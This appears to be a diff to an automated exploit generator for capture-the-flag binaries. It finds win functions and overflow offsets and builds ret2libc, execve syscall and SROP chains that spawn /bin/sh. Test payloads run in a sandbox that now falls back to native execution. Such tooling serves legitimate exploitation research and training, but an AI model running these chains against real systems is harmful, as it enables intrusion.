@@ -16,6 +16,8 @@ import subprocess
 from dataclasses import dataclass, field
 from typing import List, Optional
 
+from ._sandbox import run_bash
+
 try:
     import angr  # type: ignore
     import logging as _lg
@@ -77,14 +79,24 @@ def find_win(binary: str) -> Optional[int]:
     # fcn.00401176 (sin nombre) llama a system("/bin/sh"), misma direccion que 'win' en la
     # variante no-stripped del mismo reto.
     #
-    # 'aaa' (analisis profundo), NO 'aa', a proposito: bug real encontrado en vivo en este mismo
-    # binario -- con la deteccion ligera de 'aa', r2 fusiona la funcion gift DENTRO del trampolin
-    # de entrada (entry.init0, que empieza con 'endbr64; jmp ...') en vez de reconocerla como
-    # funcion propia, asi que NINGUN xref a system/execve se descubre y este fallback devolvia
-    # None siempre en binarios con ese patron de entrada (confirmado: gcc moderno con CET activo
-    # por defecto en las crt*.o precompiladas del sistema, incluso compilando el propio codigo con
-    # -fcf-protection=none). Este fallback solo se alcanza cuando la busqueda rapida por nombre ya
-    # fallo (caso raro, binario pequeno), asi que el coste extra de 'aaa' es aceptable aqui.
+    # 'aaa' (analisis profundo), NO 'aa', a proposito: bug real encontrado en vivo (dos veces, por
+    # separado) en binarios con este mismo patron de entrada -- con la deteccion ligera de 'aa',
+    # r2 fusiona la funcion gift DENTRO del trampolin de entrada (entry.init0, que empieza con
+    # 'endbr64; jmp ...') en vez de reconocerla como funcion propia, asi que NINGUN xref a
+    # system/execve se descubre y este fallback devolvia None siempre en binarios con ese patron
+    # (confirmado: gcc moderno con CET activo por defecto en las crt*.o precompiladas del sistema,
+    # incluso compilando el propio codigo con -fcf-protection=none; en radare2 5.5.0, `aa; axt` no
+    # encuentra nada, `aaa; axt` si). Este fallback solo se alcanza cuando la busqueda rapida por
+    # nombre ya fallo (caso raro, binario pequeno), asi que el coste extra de 'aaa' es aceptable.
+    #
+    # NOTA (investigado en vivo, descartado adrede): probar aqui la sesion r2 CACHEADA (r2session)
+    # en vez de un subproceso nuevo por llamada parecia la optimizacion obvia (evita repetir
+    # `aaa`) -- pero `r.cmd('axt @ sym.imp.<sink>')` sobre esa sesion PERSISTENTE se cuelga de
+    # verdad en esta version de radare2 (confirmado con y sin el simbolo presente, y
+    # `cmd_timeout()` -- pensado exactamente para esto -- tampoco recuperaba el pipe a tiempo de
+    # forma fiable aqui). El subproceso ONE-SHOT de abajo (`_r2()`) SI es fiable: cada llamada es
+    # un `radare2` nuevo con su propio `subprocess.run(..., timeout=90)`, que Python SI mata de
+    # forma dura si se cuelga. Mas lento (repite `aaa`), pero nunca cuelga el pipeline.
     for sink in ("system", "execve", "execl", "execlp"):
         callers = _r2(binary, f"aaa; axt @ sym.imp.{sink}")
         for m in re.finditer(r"^\S+\s+(0x[0-9a-fA-F]+)\s+\[CALL", callers, re.M):
@@ -124,40 +136,60 @@ def find_ret_gadget(binary: str) -> Optional[int]:
     return int(m.group(1), 16) if m else None
 
 
-def find_pc_offset(binary: str, maxlen: int = 400, budget_s: float = 20.0) -> Optional[int]:
-    """Find the offset from input to the saved return address, symbolically (no run).
-
-    Bounded by WALL-CLOCK time (budget_s), not just step count: a menu/heap-driven binary
-    (malloc/free with a symbolic size/index) can make a SINGLE simgr.step() take minutes on
-    its own, because Z3's bit-blaster for symbolic MULTIPLICATION (size*count style) can blow
-    up -- confirmed via a process sample showing 100% time inside
-    bit_blaster_tpl::mk_const_case_multiplier while symbolically exploring a heap-menu binary.
-    The previous `steps < 400` cap does not protect against that (400 steps stuck on step #50
-    still hangs indefinitely). This is a stack-overflow-shaped strategy (flood stdin until PC
-    is unconstrained); for heap-classified binaries it should fail FAST so the static fallback
-    (_static_offset) gets a chance within the caller's overall budget, not eat all of it."""
-    if not _HAVE_ANGR:
-        return None
+def _pc_offset_worker(binary: str, q) -> None:
+    """Child-process body: symbolically flood stdin until PC is unconstrained and report the
+    offset. Runs in its own process so the parent can hard-kill it on deadline (see below)."""
     try:
-        import time as _time
-        proj = angr.Project(binary, auto_load_libs=False)
+        import angr as _angr
+        proj = _angr.Project(binary, auto_load_libs=False)
         state = proj.factory.entry_state()
         simgr = proj.factory.simulation_manager(state, save_unconstrained=True)
         steps = 0
-        deadline = _time.time() + budget_s
         while simgr.active and not simgr.unconstrained and steps < 400:
-            if _time.time() > deadline:
-                return None
             simgr.step()
             steps += 1
-        if not simgr.unconstrained:
+        if simgr.unconstrained:
+            u = simgr.unconstrained[0]
+            pc_val = u.solver.eval(u.regs.pc)
+            pc_bytes = pc_val.to_bytes(proj.arch.bytes, "little")
+            off = u.posix.dumps(0).find(pc_bytes)
+            q.put(off if off >= 0 else None)
+            return
+    except Exception:
+        pass
+    q.put(None)
+
+
+def find_pc_offset(binary: str, maxlen: int = 400, budget_s: float = 20.0) -> Optional[int]:
+    """Find the offset from input to the saved return address, symbolically (no run).
+
+    HARD-bounded by WALL-CLOCK time: a menu/heap-driven binary (malloc/free with a symbolic
+    size/index) can make a SINGLE simgr.step() take minutes on its own, because Z3's bit-blaster
+    for symbolic MULTIPLICATION (size*count style) can blow up -- confirmed via a process sample
+    showing 100% time inside bit_blaster_tpl::mk_const_case_multiplier. A between-steps deadline
+    check does NOT help there: the loop is stuck INSIDE one step, so it never comes back to
+    check. The only reliable bound is to run the exploration in a child process and KILL it at
+    the deadline; Z3's C/Python call won't honor a Python-level timeout or signal. This is a
+    stack-overflow-shaped strategy (flood stdin until PC is unconstrained); for heap binaries it
+    then fails fast so the static fallback (_static_offset) gets its turn within the budget."""
+    if not _HAVE_ANGR:
+        return None
+    import multiprocessing as mp
+    try:
+        ctx = mp.get_context("spawn")        # fork after importing z3 can deadlock; spawn is safe
+        q = ctx.Queue()
+        p = ctx.Process(target=_pc_offset_worker, args=(binary, q), daemon=True)
+        p.start()
+        p.join(budget_s)
+        if p.is_alive():
+            p.terminate(); p.join(2)
+            if p.is_alive():
+                p.kill(); p.join(1)
             return None
-        u = simgr.unconstrained[0]
-        pc_val = u.solver.eval(u.regs.pc)
-        pc_bytes = pc_val.to_bytes(proj.arch.bytes, "little")
-        inp = u.posix.dumps(0)
-        off = inp.find(pc_bytes)
-        return off if off >= 0 else None
+        try:
+            return q.get(timeout=1)
+        except Exception:
+            return None
     except Exception:
         return None
 
@@ -181,9 +213,6 @@ io.interactive()
 
 
 def _docker_run(binary: str, payload: bytes) -> (bool, str):
-    docker = shutil.which("docker")
-    if not docker:
-        return (False, "docker not available")
     d = os.path.dirname(os.path.abspath(binary))
     name = os.path.basename(binary)
     with open(os.path.join(d, ".poc_payload"), "wb") as f:
@@ -198,16 +227,11 @@ def _docker_run(binary: str, payload: bytes) -> (bool, str):
            f"| stdbuf -oL -eL ./{name} 2>&1 | head -80")
     try:
         # binoracle-pwn (no gcc:13): trae libc6:i386, necesaria para binarios de 32 bits como
-        # ret2win32 (gcc:13 no tiene multiarch instalado y qemu-i386 falla al no encontrar
-        # /lib/ld-linux.so.2). bash/stdbuf/chmod/head ya estan en esa imagen.
-        out = subprocess.run(
-            [docker, "run", "--rm", "--platform", "linux/amd64", "--network", "none",
-             "--memory", "256m", "--pids-limit", "128", "-v", d + ":/w", "-w", "/w",
-             "binoracle-pwn", "bash", "-c", run],
-            capture_output=True, text=True, timeout=120)
-        return (True, out.stdout + out.stderr)
-    except subprocess.TimeoutExpired:
-        return (True, "[timed out]")
+        # ret2win32. Sin la imagen, run_bash cae a ejecucion nativa (solo binarios x86-64).
+        engine, out = run_bash(binary, run, timeout=120, mem_mb=256)
+        if engine is None:
+            return (False, out)
+        return (True, out)
     finally:
         try:
             os.unlink(os.path.join(d, ".poc_payload"))
@@ -215,11 +239,25 @@ def _docker_run(binary: str, payload: bytes) -> (bool, str):
             pass
 
 
+_STATIC_OFFSET_FN_CAP = 400       # ver nota de regresion mas abajo
+_STATIC_OFFSET_TIME_BUDGET = 20.0  # segundos
+
+
 def _static_offset(binary: str) -> Optional[int]:
     """Offset a la direccion de retorno guardada para el caso clasico de buffer de pila, SIN
     ejecutar: la variable local (base rbp) mas profunda de la funcion que llama a un sink de
     lectura, mas el tamano del rbp/ebp guardado (word size: 4 en x86, 8 en x86_64). Robusto
-    donde la ejecucion simbolica de angr se equivoca."""
+    donde la ejecucion simbolica de angr se equivoca.
+
+    REGRESION encontrada en vivo (corriendo la suite de tests completa): el bucle hacia UN
+    `pdf @ fn` (desensamblado completo) POR FUNCION de `aflj`, sin limite ni presupuesto. En un
+    binario estaticamente enlazado (p.ej. ropme_pie: 1086 funciones, la libc entera queda
+    embebida) eso son 1000+ viajes de ida y vuelta sincronos por el pipe de r2 -- minutos, no
+    milisegundos -- colgando el pipeline entero (chain-analyzer, audit, investigate) para
+    cualquier binario estatico. El caso comun (binario dinamico, decenas de funciones propias)
+    sigue siendo instantaneo; esto solo acota el caso patologico, degradando a 'no concluyente'
+    (best=None, ya manejado por _offset_candidates) en vez de colgar."""
+    import time as _time
     try:
         import r2pipe
         r = r2pipe.open(binary, flags=["-2"])
@@ -227,7 +265,10 @@ def _static_offset(binary: str) -> Optional[int]:
         fns = json.loads(r.cmd("aflj") or "[]")
         read_sinks = ("read", "gets", "fgets", "scanf", "isoc99_scanf", "recv", "fread", "gets_s")
         best = None
-        for fn in fns:
+        t0 = _time.time()
+        for i, fn in enumerate(fns):
+            if i >= _STATIC_OFFSET_FN_CAP or (_time.time() - t0) > _STATIC_OFFSET_TIME_BUDGET:
+                break
             name = fn.get("name", "")
             dis = r.cmd(f"pdf @ {name}") or ""
             if not any(s in dis for s in read_sinks):
@@ -345,24 +386,19 @@ def render_poc(r: PoCResult, lang: str = "es") -> str:
 
 
 def _docker_run_raw(binary: str, data: bytes):
-    """Run the target in an x86-64 sandbox feeding EXACTLY `data` on stdin (line-buffered)."""
-    docker = shutil.which("docker")
-    if not docker:
-        return (False, "docker not available")
+    """Run the target in an x86-64 sandbox feeding EXACTLY `data` on stdin (line-buffered).
+    Docker image preferred; falls back to native isolation when it is absent."""
     d = os.path.dirname(os.path.abspath(binary))
     name = os.path.basename(binary)
     with open(os.path.join(d, ".poc_raw"), "wb") as f:
         f.write(data)
     try:
-        # binoracle-pwn: ver comentario en _docker_run() sobre soporte i386 para ret2win32.
-        out = subprocess.run(
-            [docker, "run", "--rm", "--platform", "linux/amd64", "--network", "none",
-             "--memory", "256m", "--pids-limit", "128", "-v", d + ":/w", "-w", "/w",
-             "binoracle-pwn", "bash", "-c", f"chmod +x ./{name}; stdbuf -oL -eL ./{name} < .poc_raw 2>&1 | head -60"],
-            capture_output=True, text=True, timeout=120)
-        return (True, out.stdout + out.stderr)
-    except subprocess.TimeoutExpired:
-        return (True, "[timed out]")
+        engine, out = run_bash(
+            binary, f"chmod +x ./{name}; stdbuf -oL -eL ./{name} < .poc_raw 2>&1 | head -60",
+            timeout=120, mem_mb=256)
+        if engine is None:
+            return (False, out)
+        return (True, out)
     finally:
         try:
             os.unlink(os.path.join(d, ".poc_raw"))
@@ -387,11 +423,14 @@ def autorop(binary: str, offset=None, run: bool = True) -> dict:
     except Exception as e:
         return {"ok": False, "note": f"no carga: {e}"}
     binsh = next(elf.search(b"/bin/sh\x00"), None)
+    is32 = getattr(elf, "bits", 64) == 32          # x86-32: cdecl, execve=11, int 0x80, SROP distinto
     rop = ROP(elf)
     built = False
     strategy = ""
     if binsh is not None:
-        # 1) ret2libc system('/bin/sh') if system is available (dynamic or static-with-system)
+        # 1) ret2libc system('/bin/sh') if system is available (dynamic or static-with-system).
+        #    ARCH-AGNOSTICO: rop.call() coloca el arg en el registro (x64) o en la pila (x86-32 cdecl)
+        #    segun el contexto del ELF. Verificado en sandbox con ret2win32 (x86-32): shell real.
         try:
             sysaddr = elf.plt.get("system") or (elf.symbols or {}).get("system")
             if sysaddr:
@@ -402,22 +441,85 @@ def autorop(binary: str, offset=None, run: bool = True) -> dict:
                 rop.call(sysaddr, [binsh]); built = True; strategy = "ret2libc system"
         except Exception:
             pass
-        # 2) explicit execve syscall chain (robust; avoids pwntools SROP)
+        # 2) explicit execve syscall chain. ARCH-AWARE: en x86-32 es eax=11/ebx/ecx/edx + `int 0x80`;
+        #    en x86-64 es rax=0x3b/rdi/rsi/rdx + `syscall`. Antes esta rama fijaba SIEMPRE rax/rdi
+        #    (64-bit) con execve=0x3b aunque el binario fuese de 32 bits -> cadena incorrecta.
         if not built:
             try:
-                rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0
-                sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
+                if is32:
+                    rop.eax = 0x0b; rop.ebx = binsh; rop.ecx = 0; rop.edx = 0
+                    sc = rop.find_gadget(["int 0x80"])
+                else:
+                    rop.rax = 0x3b; rop.rdi = binsh; rop.rsi = 0; rop.rdx = 0
+                    sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
                 if sc:
                     rop.raw(sc.address)
-                    built = True; strategy = "execve syscall (gadgets)"
+                    built = True
+                    strategy = ("execve int0x80 (gadgets, x86-32)" if is32
+                                else "execve syscall (gadgets)")
             except Exception:
                 pass
-        # 3) last resort: let pwntools pick (may use sigreturn)
-        if not built:
-            try:
-                rop.execve(binsh, 0, 0); built = True; strategy = "execve (pwntools auto)"
-            except Exception:
-                pass
+    # 3) Let pwntools build execve('/bin/sh'), STAGING the string into writable memory when the
+    #    binary has no "/bin/sh" literal (common in static binaries where the linker dropped it,
+    #    e.g. staticrop). Passing the literal bytes makes pwntools write them to .bss/.data with
+    #    the available gadgets and point the syscall at them -- so we don't depend on an existing
+    #    string. A fresh ROP() per attempt so a half-built chain from above isn't reused.
+    if not built:
+        target = binsh if binsh is not None else b"/bin/sh\x00"
+        try:
+            rop = ROP(elf)
+            rop.execve(target, 0, 0)
+            rop.chain()                             # force resolution now (raises if unsatisfiable)
+            built = True
+            strategy = ("execve (pwntools auto)" if binsh is not None
+                        else "execve (pwntools, '/bin/sh' staged a .bss)")
+        except Exception:
+            built = False
+    # 4) explicit SROP fallback: a fake sigcontext (rt_sigreturn, RAX=15) sets ALL registers at
+    #    once, so it needs only `pop rax; ret` + a syscall gadget -- no pop rdi/rsi/rdx. Used when
+    #    the execve chain can't satisfy the arg registers. Needs an in-memory "/bin/sh" (binsh).
+    # 4) explicit SROP fallback: a fake sigcontext sets ALL registers at once, so it needs only
+    #    `pop {r,e}ax; ret` + a syscall gate -- no pop rdi/rsi/rdx. Used when the execve chain
+    #    can't satisfy the arg registers. Needs an in-memory "/bin/sh" (binsh). Arch-aware.
+    if not built and binsh is not None:
+        try:
+            from pwn import SigreturnFrame
+            rop = ROP(elf)
+            if is32:
+                # x86-32: sigreturn is syscall 119 (0x77) via `int 0x80`; the restored frame runs
+                # execve (eax=11) with ebx=&binsh, triggered by the frame's eip = int 0x80 gate.
+                pop_ax = rop.find_gadget(["pop eax", "ret"])
+                sc = rop.find_gadget(["int 0x80"])
+                if pop_ax and sc:
+                    frame = SigreturnFrame(kernel="i386")   # i386 frame needs the kernel arch
+                    frame.eax = 0x0b                 # execve
+                    frame.ebx = binsh
+                    frame.ecx = 0
+                    frame.edx = 0
+                    frame.eip = sc.address
+                    # modern Linux i386 user segments (pwntools defaults to legacy 0x73/0x7b/0)
+                    frame.cs = 0x23; frame.ss = 0x2b; frame.ds = 0x2b
+                    frame.es = 0x2b; frame.gs = 0x63; frame.fs = 0
+                    rop.raw(pop_ax.address); rop.raw(0x77)   # EAX = 119 (sigreturn)
+                    rop.raw(sc.address)                      # int 0x80 -> sigreturn consumes the frame
+                    rop.raw(bytes(frame))
+                    built = True; strategy = "SROP (sigreturn execve, x86-32)"
+            else:
+                pop_rax = rop.find_gadget(["pop rax", "ret"])
+                sc = rop.find_gadget(["syscall", "ret"]) or rop.find_gadget(["syscall"])
+                if pop_rax and sc:
+                    frame = SigreturnFrame()
+                    frame.rax = 0x3b                 # execve
+                    frame.rdi = binsh
+                    frame.rsi = 0
+                    frame.rdx = 0
+                    frame.rip = sc.address           # the frame's RIP runs execve('/bin/sh', 0, 0)
+                    rop.raw(pop_rax.address); rop.raw(15)   # RAX = 15 (rt_sigreturn)
+                    rop.raw(sc.address)                     # syscall -> rt_sigreturn consumes the frame
+                    rop.raw(bytes(frame))
+                    built = True; strategy = "SROP (sigreturn execve)"
+        except Exception:
+            pass
     if not built:
         return {"ok": False, "note": "no se pudo construir cadena automatica (sin /bin/sh o "
                 "gadgets suficientes; ret2libc dinamico necesita libc/leak)"}
